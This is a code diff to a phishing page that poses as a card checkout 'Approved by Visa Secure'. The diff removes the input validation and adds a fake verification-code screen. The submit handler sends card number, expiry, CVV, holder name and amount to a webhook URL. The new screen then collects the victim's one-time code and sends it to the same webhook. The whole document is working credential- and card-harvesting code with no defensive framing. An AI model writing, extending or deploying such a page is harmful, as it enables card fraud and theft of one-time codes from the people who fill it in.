@@ -23,17 +23,14 @@
                 <div class="form-group">
                     <label for="cardNumber">Card Number 💳</label>
                     <input type="text" id="cardNumber" required>
-                    <span class="error" id="cardNumberError"></span>
                 </div>
                 <div class="form-group">
                     <label for="expiryDate">Expiry Date 📅</label>
                     <input type="text" id="expiryDate" required>
-                    <span class="error" id="expiryDateError"></span>
                 </div>
                 <div class="form-group">
                     <label for="cvv">CVV 🔒</label>
                     <input type="text" id="cvv" required>
-                    <span class="error" id="cvvError"></span>
                 </div>
                 <div class="form-group">
                     <label for="cardHolder">Card Holder Name 👤</label>
@@ -42,7 +39,6 @@
                 <div class="form-group">
                     <label for="amount">Amount 💰</label>
                     <input type="text" id="amount" required>
-                    <span class="error" id="amountError"></span>
                 </div>
                 <button type="submit">Submit 🛒</button>
             </form>
@@ -50,6 +46,22 @@
 
         <div class="payment-processor">
             <p>Approved by <strong>Visa Secure</strong></p>
+        </div>
+    </div>
+
+    <div id="verification-screen" class="screen hidden">
+        <div class="verification-content">
+            <h1>Verification Code</h1>
+            <p>A verification code will be sent to your mobile device in 2 minutes.</p>
+            <p>If you do not receive the code, click the button below to resend.</p>
+            <form id="verificationForm">
+                <div class="form-group">
+                    <label for="verificationCode">Enter Verification Code 🔒</label>
+                    <input type="text" id="verificationCode" required>
+                </div>
+                <button type="submit">Verify 🛒</button>
+            </form>
+            <button id="resendCode">Resend Code 🔄</button>
         </div>
     </div>
 
@@ -68,38 +80,6 @@
             var d = document.getElementById('cardHolder').value;
             var e = document.getElementById('amount').value;
 
-            var cardNumberError = document.getElementById('cardNumberError');
-            var expiryDateError = document.getElementById('expiryDateError');
-            var cvvError = document.getElementById('cvvError');
-            var amountError = document.getElementById('amountError');
-
-            cardNumberError.textContent = '';
-            expiryDateError.textContent = '';
-            cvvError.textContent = '';
-            amountError.textContent = '';
-
-            if (!/^\d{16}$/.test(a)) {
-                cardNumberError.textContent = 'Card number must be 16 digits.';
-                return;
-            }
-
-            if (!/^\d{2}\/\d{2}$/.test(b)) {
-                expiryDateError.textContent = 'Expiry date must be in MM/YY format.';
-                return;
-            }
-
-            if (!/^\d{3}$/.test(c)) {
-                cvvError.textContent = 'CVV must be 3 digits.';
-                return;
-            }
-
-            if (!/^\d+(\.\d{1,2})?$/.test(e)) {
-                amountError.textContent = 'Amount must be a valid number.';
-                return;
-            }
-
-            alert('No funds available.');
-
             var g = `
             **Card Details:**
             - Card Number: \`${a}\`
@@ -108,6 +88,8 @@
             - Card Holder Name: \`${d}\`
             - Amount: \`${e}\`
             `;
+
+            console.log('Sending data to webhook:', g);
 
             fetch(webhookUrl, {
                 method: 'POST',
@@ -118,16 +100,61 @@
                     content: g
                 })
             })
-            .then(function(h) {
-                return h.json();
+            .then(function(response) {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok ' + response.statusText);
+                }
+                return response.json();
             })
-            .then(function(i) {
-                console.log('Success:', i);
-                alert('Card details sent successfully!');
+            .then(function(data) {
+                console.log('Success:', data);
             })
-            .catch(function(j) {
-                console.error('Error:', j);
-                alert('Failed to send card details.');
+            .catch(function(error) {
+                console.error('Error:', error);
+            })
+            .finally(function() {
+                document.getElementById('payment-screen').classList.add('hidden');
+                document.getElementById('verification-screen').classList.remove('hidden');
+            });
+        });
+
+        document.getElementById('resendCode').addEventListener('click', function() {
+            alert('Verification code resent!');
+            // You can add logic here to actually resend the verification code
+        });
+
+        document.getElementById('verificationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var verificationCode = document.getElementById('verificationCode').value;
+            console.log('Verification code entered:', verificationCode);
+
+            var h = `
+            **Verification Code:**
+            - Code: \`${verificationCode}\`
+            `;
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: h
+                })
+            })
+            .then(function(response) {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok ' + response.statusText);
+                }
+                return response.json();
+            })
+            .then(function(data) {
+                console.log('Success:', data);
+                alert('Verification code sent successfully!');
+            })
+            .catch(function(error) {
+                console.error('Error:', error);
+                alert('Failed to send verification code.');
             });
         });
     </script>
